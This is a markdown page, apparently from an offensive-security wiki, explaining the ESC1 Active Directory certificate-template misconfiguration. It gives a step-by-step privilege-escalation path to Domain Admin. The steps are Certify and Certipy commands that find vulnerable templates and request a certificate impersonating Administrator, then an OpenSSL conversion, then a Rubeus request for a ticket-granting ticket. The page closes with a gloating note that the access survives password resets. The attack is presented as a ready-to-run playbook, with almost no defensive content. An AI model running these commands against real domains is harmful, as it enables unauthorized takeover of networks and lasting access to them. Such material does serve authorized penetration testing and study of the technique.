---
title: 'ESC1: The You Can Be Anyone Template'
description: 'ESC1: The "You Can Be Anyone" Template.'
icon: material/file-document-outline
---
# ESC1: The "You Can Be Anyone" Template

Ah, ESC1. The quintessential ADCS misconfiguration. This happens when a template allows Domain Users to enroll, requires client authentication, and—most importantly—has the `ENROLLEE_SUPPLIES_SUBJECT` flag enabled. 

This flag essentially tells the CA: "I trust whoever is asking to tell me who they are." It's like a bouncer letting you write your own ID at the door. If you want to be the Domain Admin, you just write "Domain Admin" on the form.

## Requirements

To pull this off, you need a template with:
* Client Authentication, Smart Card Logon, Any Purpose, or No EKU.
* The magical **`ENROLLEE_SUPPLIES_SUBJECT`** flag.
* Enrollment rights for low-privileged users (e.g., Domain Users).

## The Attack Path

### 1. Find the Vulnerable Template
Fire up your favorite tool and scan the network for templates that shouldn't exist.

* **Using Certify**:
    ```powershell
    Certify.exe find /vulnerable
    ```
* **Using Certipy**:
    ```bash
    certipy find -u 'john' -p 'Passw0rd!' -d 'domain.local' -dc-ip 192.168.100.1 -vulnerable
    ```

### 2. Request the Spoofed Certificate
Now, request a certificate using that template, but specify an alternative name (`altname`) of someone far more important than you—like the Domain Administrator.

* **Using Certify**:
    ```powershell
    Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:Administrator
    ```
* **Using Certipy**:
    ```bash
    certipy req 'domain.local/john:Passw0rd!@ca.domain.local' -ca 'domain-CA' -template 'VulnTemplate' -upn 'Administrator@domain.local'
    ```

### 3. Convert and Profit (If using Certify)
Certify gives you a `.pem` file. Windows likes `.pfx`. Let's convert it using OpenSSL (just press enter when asked for an export password).
```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

### 4. Get the TGT
Finally, use the `.pfx` to request a Ticket Granting Ticket (TGT) on behalf of the Administrator.
```powershell
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
```

!!! warning
    These certificates do not care if the user resets their password. Until the certificate expires or is explicitly revoked, you hold the keys to the kingdom. Sleep tight!
